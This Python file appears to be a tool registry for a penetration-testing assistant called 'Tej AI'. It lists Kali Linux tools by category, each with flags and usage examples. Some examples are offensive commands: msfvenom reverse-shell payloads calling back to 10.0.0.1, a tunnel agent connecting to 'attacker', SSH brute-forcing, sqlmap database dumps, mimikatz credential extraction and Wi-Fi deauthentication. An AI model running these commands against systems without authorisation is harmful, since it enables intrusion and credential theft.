"""
Tej AI - Tool Registry
Central registry of all supported Kali Linux tools organized by category.
"""

from typing import Dict, List, Optional, Any
from dataclasses import dataclass, field


@dataclass
class ToolInfo:
    """Complete information about a security tool."""
    name: str
    category: str
    description: str
    usage_examples: List[str] = field(default_factory=list)
    common_flags: Dict[str, str] = field(default_factory=dict)
    output_format: str = "text"  # text, xml, json, csv
    requires_root: bool = False
    platforms: List[str] = field(default_factory=lambda: ["linux"])
    tags: List[str] = field(default_factory=list)


# ============================================================================
# COMPLETE KALI LINUX TOOL REGISTRY
# ============================================================================

TOOL_REGISTRY: Dict[str, ToolInfo] = {}


def register_tool(tool: ToolInfo):
    """Register a tool in the global registry."""
    TOOL_REGISTRY[tool.name] = tool


# ---------------------------------------------------------------------------
# INFORMATION GATHERING / RECONNAISSANCE
# ---------------------------------------------------------------------------
register_tool(ToolInfo(
    name="nmap", category="scanning",
    description="Network exploration tool and security/port scanner",
    usage_examples=["nmap -sV 192.168.1.1", "nmap -A -T4 10.0.0.0/24", "nmap --script vuln target"],
    common_flags={"-sS": "TCP SYN scan", "-sV": "Version detection", "-O": "OS detection",
                  "-A": "Aggressive scan", "-p-": "All ports", "-sC": "Default scripts",
                  "-T4": "Timing template 4", "--script": "NSE scripts", "-sU": "UDP scan",
                  "-Pn": "Skip ping", "-sn": "Ping scan only"},
    requires_root=True, platforms=["linux", "windows"], tags=["scanner", "network", "ports"]
))

register_tool(ToolInfo(
    name="masscan", category="scanning",
    description="Fastest Internet port scanner",
    usage_examples=["masscan -p1-65535 10.0.0.0/8 --rate 10000"],
    common_flags={"-p": "Port range", "--rate": "Packet rate", "--banners": "Grab banners"},
    requires_root=True, tags=["scanner", "fast", "network"]
))

register_tool(ToolInfo(
    name="rustscan", category="scanning",
    description="Fast port scanner that feeds into nmap",
    usage_examples=["rustscan -a 192.168.1.1 -- -sC -sV"],
    common_flags={"-a": "Address", "--ulimit": "Set ulimit", "-b": "Batch size"},
    tags=["scanner", "fast"]
))

register_tool(ToolInfo(
    name="theHarvester", category="reconnaissance",
    description="E-mails, subdomains and names harvester (OSINT)",
    usage_examples=["theHarvester -d example.com -b all", "theHarvester -d target.com -b google -l 500"],
    common_flags={"-d": "Domain", "-b": "Data source", "-l": "Limit results"},
    platforms=["linux", "windows"], tags=["osint", "recon", "email", "subdomain"]
))

register_tool(ToolInfo(
    name="recon-ng", category="reconnaissance",
    description="Full-featured web reconnaissance framework",
    usage_examples=["recon-ng", "recon-ng -w workspace_name"],
    tags=["osint", "recon", "framework"]
))

register_tool(ToolInfo(
    name="spiderfoot", category="reconnaissance",
    description="OSINT automation tool",
    usage_examples=["spiderfoot -s target.com", "spiderfoot -l 127.0.0.1:5001"],
    tags=["osint", "automation"]
))

register_tool(ToolInfo(
    name="maltego", category="reconnaissance",
    description="Interactive data mining tool for OSINT",
    usage_examples=["maltego"],
    tags=["osint", "visual", "gui"]
))

register_tool(ToolInfo(
    name="amass", category="reconnaissance",
    description="In-depth attack surface mapping and asset discovery",
    usage_examples=["amass enum -d example.com", "amass enum -passive -d target.com"],
    common_flags={"enum": "Perform enumeration", "-d": "Domain", "-passive": "Passive only"},
    platforms=["linux", "windows"], tags=["subdomain", "recon", "dns"]
))

register_tool(ToolInfo(
    name="sublist3r", category="reconnaissance",
    description="Fast subdomain enumeration tool",
    usage_examples=["sublist3r -d example.com"],
    common_flags={"-d": "Domain", "-t": "Threads", "-o": "Output file"},
    tags=["subdomain", "recon"]
))

register_tool(ToolInfo(
    name="fierce", category="reconnaissance",
    description="DNS reconnaissance tool for locating non-contiguous IP space",
    usage_examples=["fierce --domain example.com"],
    tags=["dns", "recon"]
))

register_tool(ToolInfo(
    name="dnsenum", category="reconnaissance",
    description="DNS enumeration tool",
    usage_examples=["dnsenum example.com"],
    tags=["dns", "recon"]
))

register_tool(ToolInfo(
    name="dnsrecon", category="reconnaissance",
    description="DNS enumeration and scanning tool",
    usage_examples=["dnsrecon -d example.com -t std"],
    common_flags={"-d": "Domain", "-t": "Type of enumeration"},
    tags=["dns", "recon"]
))

register_tool(ToolInfo(
    name="whois", category="reconnaissance",
    description="Domain registration information lookup",
    usage_examples=["whois example.com", "whois 93.184.216.34"],
    platforms=["linux", "windows"], tags=["dns", "recon", "domain"]
))

register_tool(ToolInfo(
    name="dig", category="reconnaissance",
    description="DNS lookup utility",
    usage_examples=["dig example.com", "dig @8.8.8.8 example.com ANY"],
    platforms=["linux", "windows"], tags=["dns", "recon"]
))

register_tool(ToolInfo(
    name="host", category="reconnaissance",
    description="DNS lookup utility",
    usage_examples=["host example.com", "host -t MX example.com"],
    tags=["dns", "recon"]
))

register_tool(ToolInfo(
    name="shodan", category="reconnaissance",
    description="Search engine for Internet-connected devices",
    usage_examples=["shodan search apache", "shodan host 1.2.3.4"],
    platforms=["linux", "windows"], tags=["osint", "iot", "search"]
))

# ---------------------------------------------------------------------------
# VULNERABILITY ANALYSIS
# ---------------------------------------------------------------------------
register_tool(ToolInfo(
    name="nikto", category="vulnerability_analysis",
    description="Web server scanner for dangerous files/CGIs and vulnerabilities",
    usage_examples=["nikto -h http://target.com", "nikto -h target -C all"],
    common_flags={"-h": "Target host", "-C": "Force check all CGI dirs", "-ssl": "Use SSL",
                  "-o": "Output file", "-Format": "Output format"},
    tags=["web", "scanner", "vulnerability"]
))

register_tool(ToolInfo(
    name="wpscan", category="vulnerability_analysis",
    description="WordPress security scanner",
    usage_examples=["wpscan --url http://target.com", "wpscan --url target -e ap,at,u"],
    common_flags={"--url": "Target URL", "-e": "Enumerate", "--api-token": "WPScan API token"},
    platforms=["linux", "windows"], tags=["web", "wordpress", "scanner"]
))

register_tool(ToolInfo(
    name="nuclei", category="vulnerability_analysis",
    description="Fast vulnerability scanner based on templates",
    usage_examples=["nuclei -u http://target.com", "nuclei -u target -severity critical,high"],
    common_flags={"-u": "Target URL", "-t": "Templates", "-severity": "Filter by severity"},
    platforms=["linux", "windows"], tags=["scanner", "vulnerability", "templates"]
))

register_tool(ToolInfo(
    name="searchsploit", category="vulnerability_analysis",
    description="Search ExploitDB for exploits from the command line",
    usage_examples=["searchsploit apache 2.4", "searchsploit -x 12345", "searchsploit -m 12345"],
    common_flags={"-x": "Examine exploit", "-m": "Mirror/copy exploit", "-w": "Show URL"},
    tags=["exploit", "search", "database"]
))

register_tool(ToolInfo(
    name="openvas", category="vulnerability_analysis",
    description="Open Vulnerability Assessment Scanner",
    usage_examples=["openvas-start", "gvm-start"],
    requires_root=True, tags=["scanner", "vulnerability", "enterprise"]
))

register_tool(ToolInfo(
    name="lynis", category="vulnerability_analysis",
    description="Security auditing tool for Linux/macOS/Unix",
    usage_examples=["lynis audit system", "lynis audit system --quick"],
    tags=["audit", "hardening", "compliance"]
))

register_tool(ToolInfo(
    name="whatweb", category="vulnerability_analysis",
    description="Web application fingerprinting tool",
    usage_examples=["whatweb target.com", "whatweb -a 3 target.com"],
    common_flags={"-a": "Aggression level (1-4)", "-v": "Verbose"},
    tags=["web", "fingerprint", "recon"]
))

register_tool(ToolInfo(
    name="wafw00f", category="vulnerability_analysis",
    description="Web Application Firewall detection tool",
    usage_examples=["wafw00f http://target.com", "wafw00f -a target.com"],
    common_flags={"-a": "Test all WAFs"},
    tags=["web", "waf", "detection"]
))

register_tool(ToolInfo(
    name="joomscan", category="vulnerability_analysis",
    description="Joomla CMS vulnerability scanner",
    usage_examples=["joomscan -u http://target.com"],
    tags=["web", "joomla", "scanner"]
))

# ---------------------------------------------------------------------------
# WEB APPLICATION TESTING
# ---------------------------------------------------------------------------
register_tool(ToolInfo(
    name="sqlmap", category="web_application",
    description="Automatic SQL injection and database takeover tool",
    usage_examples=["sqlmap -u 'http://target.com/page?id=1'", "sqlmap -u target --dbs",
                    "sqlmap -u target --dump-all --batch"],
    common_flags={"-u": "Target URL", "--dbs": "Enumerate databases", "--dump": "Dump tables",
                  "--batch": "Non-interactive", "--level": "Test level (1-5)",
                  "--risk": "Risk level (1-3)", "--os-shell": "OS shell"},
    platforms=["linux", "windows"], tags=["web", "sqli", "database", "injection"]
))

register_tool(ToolInfo(
    name="burpsuite", category="web_application",
    description="Web application security testing platform",
    usage_examples=["burpsuite"],
    platforms=["linux", "windows"], tags=["web", "proxy", "scanner", "gui"]
))

register_tool(ToolInfo(
    name="zaproxy", category="web_application",
    description="OWASP ZAP - Web application security scanner",
    usage_examples=["zaproxy", "zap-cli quick-scan http://target.com"],
    platforms=["linux", "windows"], tags=["web", "scanner", "proxy"]
))

register_tool(ToolInfo(
    name="gobuster", category="web_application",
    description="Directory/file & DNS busting tool written in Go",
    usage_examples=["gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt",
                    "gobuster dns -d target.com -w subdomains.txt"],
    common_flags={"dir": "Directory mode", "dns": "DNS mode", "vhost": "Virtual host mode",
                  "-u": "Target URL", "-w": "Wordlist", "-t": "Threads"},
    platforms=["linux", "windows"], tags=["web", "directory", "brute"]
))

register_tool(ToolInfo(
    name="dirb", category="web_application",
    description="Web content scanner / directory brute forcer",
    usage_examples=["dirb http://target.com", "dirb http://target.com /usr/share/wordlists/dirb/big.txt"],
    tags=["web", "directory", "brute"]
))

register_tool(ToolInfo(
    name="ffuf", category="web_application",
    description="Fast web fuzzer written in Go",
    usage_examples=["ffuf -u http://target.com/FUZZ -w wordlist.txt",
                    "ffuf -u http://FUZZ.target.com -w subdomains.txt"],
    common_flags={"-u": "Target URL", "-w": "Wordlist", "-mc": "Match codes",
                  "-fc": "Filter codes", "-H": "Header", "-X": "HTTP method"},
    platforms=["linux", "windows"], tags=["web", "fuzzer", "fast"]
))

register_tool(ToolInfo(
    name="wfuzz", category="web_application",
    description="Web application fuzzer",
    usage_examples=["wfuzz -c -z file,wordlist.txt http://target.com/FUZZ"],
    common_flags={"-c": "Color output", "-z": "Payload specification", "--hc": "Hide code"},
    tags=["web", "fuzzer"]
))

register_tool(ToolInfo(
    name="feroxbuster", category="web_application",
    description="Fast content discovery tool written in Rust",
    usage_examples=["feroxbuster -u http://target.com -w wordlist.txt"],
    common_flags={"-u": "Target URL", "-w": "Wordlist", "-t": "Threads", "-x": "Extensions"},
    platforms=["linux", "windows"], tags=["web", "directory", "fast"]
))

register_tool(ToolInfo(
    name="commix", category="web_application",
    description="Automated OS command injection exploitation tool",
    usage_examples=["commix --url='http://target.com/page?cmd=test'"],
    tags=["web", "injection", "command"]
))

register_tool(ToolInfo(
    name="xsser", category="web_application",
    description="Cross-site scripting (XSS) scanner",
    usage_examples=["xsser --url 'http://target.com/search?q=XSS'"],
    tags=["web", "xss", "scanner"]
))

register_tool(ToolInfo(
    name="dalfox", category="web_application",
    description="Parameter analysis and XSS scanning tool",
    usage_examples=["dalfox url http://target.com/page?q=test"],
    platforms=["linux", "windows"], tags=["web", "xss", "scanner"]
))

# ---------------------------------------------------------------------------
# PASSWORD ATTACKS
# ---------------------------------------------------------------------------
register_tool(ToolInfo(
    name="john", category="password_attacks",
    description="John the Ripper - password cracker",
    usage_examples=["john hashes.txt", "john --wordlist=rockyou.txt hashes.txt",
                    "john --format=NT hashes.txt"],
    common_flags={"--wordlist": "Use wordlist", "--format": "Hash format",
                  "--rules": "Enable word mangling rules", "--show": "Show cracked passwords"},
    platforms=["linux", "windows"], tags=["password", "crack", "hash"]
))

register_tool(ToolInfo(
    name="hashcat", category="password_attacks",
    description="Advanced GPU-accelerated password recovery",
    usage_examples=["hashcat -m 0 hashes.txt rockyou.txt", "hashcat -m 1000 -a 3 hashes.txt ?a?a?a?a"],
    common_flags={"-m": "Hash type", "-a": "Attack mode", "-r": "Rules file",
                  "--show": "Show cracked", "-O": "Optimized kernels"},
    platforms=["linux", "windows"], tags=["password", "crack", "gpu", "hash"]
))

register_tool(ToolInfo(
    name="hydra", category="password_attacks",
    description="Fast network logon cracker supporting many protocols",
    usage_examples=["hydra -l admin -P rockyou.txt ssh://192.168.1.1",
                    "hydra -l admin -P rockyou.txt 192.168.1.1 http-post-form '/login:user=^USER^&pass=^PASS^:F=failed'"],
    common_flags={"-l": "Login name", "-L": "Login name list", "-p": "Password",
                  "-P": "Password list", "-t": "Tasks/threads", "-V": "Verbose"},
    platforms=["linux"], tags=["password", "brute", "online"]
))

register_tool(ToolInfo(
    name="medusa", category="password_attacks",
    description="Fast parallel network login auditor",
    usage_examples=["medusa -h 192.168.1.1 -u admin -P rockyou.txt -M ssh"],
    common_flags={"-h": "Target host", "-u": "Username", "-P": "Password file", "-M": "Module"},
    tags=["password", "brute", "online"]
))

register_tool(ToolInfo(
    name="ncrack", category="password_attacks",
    description="Network authentication cracking tool",
    usage_examples=["ncrack -vv --user admin -P rockyou.txt ssh://192.168.1.1"],
    tags=["password", "brute", "online"]
))

register_tool(ToolInfo(
    name="cewl", category="password_attacks",
    description="Custom wordlist generator from web pages",
    usage_examples=["cewl http://target.com -w wordlist.txt -d 2 -m 5"],
    common_flags={"-w": "Output file", "-d": "Depth", "-m": "Min word length"},
    tags=["password", "wordlist", "generator"]
))

register_tool(ToolInfo(
    name="crunch", category="password_attacks",
    description="Wordlist generator with custom character sets",
    usage_examples=["crunch 8 8 -t @@@@%%%% -o wordlist.txt"],
    common_flags={"-t": "Pattern", "-o": "Output file"},
    tags=["password", "wordlist", "generator"]
))

register_tool(ToolInfo(
    name="hash-identifier", category="password_attacks",
    description="Identify different types of hashes",
    usage_examples=["hash-identifier"],
    tags=["password", "hash", "identify"]
))

register_tool(ToolInfo(
    name="hashid", category="password_attacks",
    description="Identify hash types",
    usage_examples=["hashid 'hash_value'", "hashid -m 'hash_value'"],
    tags=["password", "hash", "identify"]
))

# ---------------------------------------------------------------------------
# EXPLOITATION TOOLS
# ---------------------------------------------------------------------------
register_tool(ToolInfo(
    name="metasploit", category="exploitation",
    description="World's most used penetration testing framework",
    usage_examples=["msfconsole", "msfconsole -q -x 'search type:exploit name:apache'"],
    platforms=["linux", "windows"], tags=["exploit", "framework", "payload"]
))

register_tool(ToolInfo(
    name="msfvenom", category="exploitation",
    description="Metasploit payload generator and encoder",
    usage_examples=["msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o payload.exe",
                    "msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell"],
    common_flags={"-p": "Payload", "-f": "Output format", "-o": "Output file",
                  "-e": "Encoder", "-b": "Bad characters", "--platform": "Platform"},
    platforms=["linux", "windows"], tags=["exploit", "payload", "shellcode"]
))

register_tool(ToolInfo(
    name="beef-xss", category="exploitation",
    description="Browser Exploitation Framework",
    usage_examples=["beef-xss"],
    tags=["exploit", "browser", "xss"]
))

register_tool(ToolInfo(
    name="setoolkit", category="social_engineering",
    description="Social Engineering Toolkit (SET)",
    usage_examples=["setoolkit"],
    requires_root=True, tags=["social", "phishing", "exploit"]
))

# ---------------------------------------------------------------------------
# POST-EXPLOITATION
# ---------------------------------------------------------------------------
register_tool(ToolInfo(
    name="mimikatz", category="post_exploitation",
    description="Windows credential extraction tool",
    usage_examples=["mimikatz.exe", "sekurlsa::logonpasswords", "lsadump::sam"],
    platforms=["windows"], tags=["credentials", "windows", "post_exploit"]
))

register_tool(ToolInfo(
    name="bloodhound", category="post_exploitation",
    description="Active Directory relationship mapper",
    usage_examples=["bloodhound-python -d domain.local -u user -p pass -c all"],
    platforms=["linux", "windows"], tags=["ad", "post_exploit", "graph"]
))

register_tool(ToolInfo(
    name="empire", category="post_exploitation",
    description="Post-exploitation and adversary emulation framework",
    usage_examples=["powershell-empire"],
    tags=["post_exploit", "c2", "framework"]
))

register_tool(ToolInfo(
    name="chisel", category="post_exploitation",
    description="Fast TCP/UDP tunnel over HTTP secured via SSH",
    usage_examples=["chisel server -p 8080 --reverse", "chisel client 10.0.0.1:8080 R:socks"],
    platforms=["linux", "windows"], tags=["tunnel", "pivot", "post_exploit"]
))

register_tool(ToolInfo(
    name="ligolo-ng", category="post_exploitation",
    description="Advanced tunneling/pivoting tool",
    usage_examples=["ligolo-proxy -selfcert", "ligolo-agent -connect attacker:11601 -ignore-cert"],
    platforms=["linux", "windows"], tags=["tunnel", "pivot", "post_exploit"]
))

register_tool(ToolInfo(
    name="proxychains", category="post_exploitation",
    description="Force TCP connections through proxy",
    usage_examples=["proxychains nmap -sT 10.0.0.1", "proxychains4 curl http://internal"],
    tags=["proxy", "pivot", "tunnel"]
))

# ---------------------------------------------------------------------------
# WIRELESS
# ---------------------------------------------------------------------------
register_tool(ToolInfo(
    name="aircrack-ng", category="wireless",
    description="Complete suite for WiFi security auditing",
    usage_examples=["aircrack-ng -w rockyou.txt capture.cap"],
    common_flags={"-w": "Wordlist", "-b": "Target BSSID"},
    requires_root=True, tags=["wifi", "crack", "wireless"]
))

register_tool(ToolInfo(
    name="airmon-ng", category="wireless",
    description="Enable/disable monitor mode on wireless interfaces",
    usage_examples=["airmon-ng start wlan0", "airmon-ng stop wlan0mon"],
    requires_root=True, tags=["wifi", "monitor", "wireless"]
))

register_tool(ToolInfo(
    name="airodump-ng", category="wireless",
    description="Capture raw 802.11 frames for aircrack-ng",
    usage_examples=["airodump-ng wlan0mon", "airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon"],
    requires_root=True, tags=["wifi", "capture", "wireless"]
))

register_tool(ToolInfo(
    name="aireplay-ng", category="wireless",
    description="Inject packets into wireless network",
    usage_examples=["aireplay-ng --deauth 10 -a BSSID wlan0mon"],
    requires_root=True, tags=["wifi", "inject", "deauth", "wireless"]
))

register_tool(ToolInfo(
    name="wifite", category="wireless",
    description="Automated wireless attack tool",
    usage_examples=["wifite", "wifite --wpa --dict rockyou.txt"],
    requires_root=True, tags=["wifi", "automated", "wireless"]
))

register_tool(ToolInfo(
    name="bettercap", category="wireless",
    description="Network attack and monitoring framework",
    usage_examples=["bettercap -iface wlan0", "bettercap -eval 'net.probe on; net.recon on'"],
    requires_root=True, platforms=["linux", "windows"], tags=["wifi", "mitm", "sniffing"]
))

register_tool(ToolInfo(
    name="reaver", category="wireless",
    description="WiFi Protected Setup (WPS) brute force tool",
    usage_examples=["reaver -i wlan0mon -b BSSID -vv"],
    requires_root=True, tags=["wifi", "wps", "brute"]
))

register_tool(ToolInfo(
    name="kismet", category="wireless",
    description="Wireless network detector, sniffer, and IDS",
    usage_examples=["kismet -c wlan0"],
    requires_root=True, tags=["wifi", "ids", "detection"]
))

# ---------------------------------------------------------------------------
# SNIFFING & SPOOFING
# ---------------------------------------------------------------------------
register_tool(ToolInfo(
    name="wireshark", category="sniffing_spoofing",
    description="Network protocol analyzer",
    usage_examples=["wireshark", "tshark -i eth0", "tshark -r capture.pcap"],
    platforms=["linux", "windows"], tags=["network", "capture", "analyze"]
))

register_tool(ToolInfo(
    name="tcpdump", category="sniffing_spoofing",
    description="Command-line network packet analyzer",
    usage_examples=["tcpdump -i eth0", "tcpdump -r capture.pcap", "tcpdump -i eth0 port 80 -w http.pcap"],
    common_flags={"-i": "Interface", "-r": "Read file", "-w": "Write file", "-n": "Don't resolve names"},
    requires_root=True, tags=["network", "capture", "packets"]
))

register_tool(ToolInfo(
    name="ettercap", category="sniffing_spoofing",
    description="Comprehensive MITM attack suite",
    usage_examples=["ettercap -G", "ettercap -T -M arp:remote /target1// /target2//"],
    requires_root=True, tags=["mitm", "arp", "sniffing"]
))

register_tool(ToolInfo(
    name="responder", category="sniffing_spoofing",
    description="LLMNR/NBT-NS/MDNS poisoner for credential capture",
    usage_examples=["responder -I eth0", "responder -I eth0 -wFb"],
    common_flags={"-I": "Interface", "-w": "Start WPAD server", "-F": "Force NTLM auth",
                  "-b": "Enable HTTP basic auth"},
    requires_root=True, platforms=["linux", "windows"], tags=["mitm", "credentials", "poisoning"]
))

register_tool(ToolInfo(
    name="mitmproxy", category="sniffing_spoofing",
    description="Interactive TLS-capable man-in-the-middle proxy",
    usage_examples=["mitmproxy", "mitmdump -w traffic.flow"],
    platforms=["linux", "windows"], tags=["proxy", "mitm", "http"]
))

register_tool(ToolInfo(
    name="macchanger", category="sniffing_spoofing",
    description="MAC address spoofing tool",
    usage_examples=["macchanger -r eth0", "macchanger -m XX:XX:XX:XX:XX:XX eth0"],
    requires_root=True, tags=["mac", "spoof", "identity"]
))

# ---------------------------------------------------------------------------
# ENUMERATION
# ---------------------------------------------------------------------------
register_tool(ToolInfo(
    name="enum4linux", category="enumeration",
    description="Windows/Samba system enumeration tool",
    usage_examples=["enum4linux -a 192.168.1.1", "enum4linux -U 192.168.1.1"],
    common_flags={"-a": "Full enumeration", "-U": "Users", "-S": "Shares", "-G": "Groups"},
    tags=["smb", "windows", "enumeration"]
))

register_tool(ToolInfo(
    name="smbclient", category="enumeration",
    description="SMB/CIFS client for accessing Windows shares",
    usage_examples=["smbclient -L //192.168.1.1", "smbclient //192.168.1.1/share -U user"],
    common_flags={"-L": "List shares", "-U": "Username", "-N": "No password"},
    tags=["smb", "shares", "files"]
))

register_tool(ToolInfo(
    name="crackmapexec", category="enumeration",
    description="Swiss army knife for pentesting networks",
    usage_examples=["crackmapexec smb 192.168.1.0/24", "crackmapexec smb target -u user -p pass --shares"],
    common_flags={"smb": "SMB protocol", "winrm": "WinRM protocol", "-u": "Username",
                  "-p": "Password", "--shares": "List shares"},
    platforms=["linux", "windows"], tags=["smb", "ad", "enumeration", "credential"]
))

register_tool(ToolInfo(
    name="impacket", category="enumeration",
    description="Collection of Python tools for network protocols",
    usage_examples=["impacket-psexec domain/user:pass@target", "impacket-secretsdump domain/user:pass@target",
                    "impacket-GetNPUsers domain/ -usersfile users.txt -no-pass"],
    platforms=["linux", "windows"], tags=["smb", "ad", "psexec", "credentials"]
))

register_tool(ToolInfo(
    name="snmpwalk", category="enumeration",
    description="SNMP data retrieval tool",
    usage_examples=["snmpwalk -v2c -c public 192.168.1.1"],
    common_flags={"-v": "SNMP version", "-c": "Community string"},
    tags=["snmp", "enumeration", "network"]
))

register_tool(ToolInfo(
    name="ldapsearch", category="enumeration",
    description="LDAP search tool",
    usage_examples=["ldapsearch -x -H ldap://192.168.1.1 -b 'dc=example,dc=com'"],
    common_flags={"-x": "Simple auth", "-H": "LDAP URI", "-b": "Search base"},
    tags=["ldap", "ad", "enumeration"]
))

register_tool(ToolInfo(
    name="netdiscover", category="enumeration",
    description="Active/passive ARP reconnaissance tool",
    usage_examples=["netdiscover -i eth0 -r 192.168.1.0/24"],
    requires_root=True, tags=["arp", "discovery", "network"]
))

# ---------------------------------------------------------------------------
# FORENSICS
# ---------------------------------------------------------------------------
register_tool(ToolInfo(
    name="autopsy", category="forensics",
    description="Digital forensics platform (GUI)",
    usage_examples=["autopsy"],
    platforms=["linux", "windows"], tags=["forensics", "disk", "gui"]
))

register_tool(ToolInfo(
    name="volatility", category="forensics",
    description="Advanced memory forensics framework",
    usage_examples=["volatility -f memory.dmp imageinfo", "vol.py -f mem.dmp windows.pslist"],
    common_flags={"-f": "Memory file", "--profile": "OS profile"},
    platforms=["linux", "windows"], tags=["forensics", "memory", "analysis"]
))

register_tool(ToolInfo(
    name="binwalk", category="forensics",
    description="Firmware analysis and extraction tool",
    usage_examples=["binwalk firmware.bin", "binwalk -e firmware.bin"],
    common_flags={"-e": "Extract", "-E": "Entropy analysis"},
    platforms=["linux", "windows"], tags=["forensics", "firmware", "extraction"]
))

register_tool(ToolInfo(
    name="foremost", category="forensics",
    description="File carving/recovery tool",
    usage_examples=["foremost -i disk.img -o recovered/"],
    common_flags={"-i": "Input file", "-o": "Output directory"},
    tags=["forensics", "recovery", "carving"]
))

register_tool(ToolInfo(
    name="steghide", category="forensics",
    description="Steganography tool for hiding/extracting data in images",
    usage_examples=["steghide extract -sf image.jpg", "steghide embed -cf image.jpg -ef secret.txt"],
    common_flags={"-sf": "Stego file", "-cf": "Cover file", "-ef": "Embed file"},
    tags=["forensics", "steganography", "hiding"]
))

register_tool(ToolInfo(
    name="exiftool", category="forensics",
    description="Read/write metadata in files",
    usage_examples=["exiftool image.jpg", "exiftool -all= image.jpg"],
    platforms=["linux", "windows"], tags=["forensics", "metadata", "exif"]
))

register_tool(ToolInfo(
    name="bulk_extractor", category="forensics",
    description="Extract useful information from disk images",
    usage_examples=["bulk_extractor -o output/ disk.img"],
    tags=["forensics", "extraction", "disk"]
))

# ---------------------------------------------------------------------------
# REVERSE ENGINEERING
# ---------------------------------------------------------------------------
register_tool(ToolInfo(
    name="ghidra", category="reverse_engineering",
    description="Software reverse engineering framework (NSA)",
    usage_examples=["ghidra", "ghidraRun"],
    platforms=["linux", "windows"], tags=["reversing", "disassembly", "decompile"]
))

register_tool(ToolInfo(
    name="radare2", category="reverse_engineering",
    description="Advanced command-line reverse engineering framework",
    usage_examples=["r2 binary", "r2 -A binary"],
    common_flags={"-A": "Analyze all", "-d": "Debug mode", "-w": "Write mode"},
    platforms=["linux", "windows"], tags=["reversing", "disassembly", "debug"]
))

register_tool(ToolInfo(
    name="gdb", category="reverse_engineering",
    description="GNU Debugger",
    usage_examples=["gdb ./binary", "gdb -q ./binary"],
    tags=["debug", "reversing", "binary"]
))

register_tool(ToolInfo(
    name="objdump", category="reverse_engineering",
    description="Display information from object files",
    usage_examples=["objdump -d binary", "objdump -x binary"],
    common_flags={"-d": "Disassemble", "-x": "All headers", "-s": "Full contents"},
    tags=["reversing", "disassembly", "elf"]
))

register_tool(ToolInfo(
    name="strace", category="reverse_engineering",
    description="Trace system calls and signals",
    usage_examples=["strace ./binary", "strace -p PID"],
    tags=["debug", "trace", "syscall"]
))

register_tool(ToolInfo(
    name="ltrace", category="reverse_engineering",
    description="Library call tracer",
    usage_examples=["ltrace ./binary"],
    tags=["debug", "trace", "library"]
))

register_tool(ToolInfo(
    name="apktool", category="reverse_engineering",
    description="Tool for reverse engineering Android APK files",
    usage_examples=["apktool d app.apk", "apktool b app/"],
    platforms=["linux", "windows"], tags=["android", "reversing", "mobile"]
))

register_tool(ToolInfo(
    name="jadx", category="reverse_engineering",
    description="Decompiler for Android DEX and APK files",
    usage_examples=["jadx app.apk", "jadx-gui app.apk"],
    platforms=["linux", "windows"], tags=["android", "decompile", "java"]
))


def get_all_tools() -> Dict[str, ToolInfo]:
    """Get all registered tools."""
    return TOOL_REGISTRY.copy()


def get_tools_by_category(category: str) -> List[ToolInfo]:
    """Get tools filtered by category."""
    return [t for t in TOOL_REGISTRY.values() if t.category == category]


def get_tools_by_tag(tag: str) -> List[ToolInfo]:
    """Get tools filtered by tag."""
    return [t for t in TOOL_REGISTRY.values() if tag in t.tags]


def search_tools(query: str) -> List[ToolInfo]:
    """Search tools by name, description, or tags."""
    query_lower = query.lower()
    results = []
    for tool in TOOL_REGISTRY.values():
        if (query_lower in tool.name.lower() or
            query_lower in tool.description.lower() or
            any(query_lower in tag for tag in tool.tags)):
            results.append(tool)
    return results


def get_all_categories() -> List[str]:
    """Get list of all tool categories."""
    return list(set(t.category for t in TOOL_REGISTRY.values()))


def get_tool_count() -> int:
    """Get total number of registered tools."""
    return len(TOOL_REGISTRY)
